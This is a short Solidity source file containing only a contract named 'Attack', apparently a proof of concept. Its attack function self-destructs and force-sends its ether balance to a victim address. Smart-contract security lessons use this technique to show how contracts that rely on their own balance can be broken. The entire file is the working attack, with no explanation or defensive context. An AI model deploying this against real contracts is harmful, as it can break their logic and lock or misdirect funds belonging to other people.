// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Attack {

    constructor() {}

    function attack(address victim) public payable {
        address payable addr = payable(address(victim));
        selfdestruct(addr);
    }
}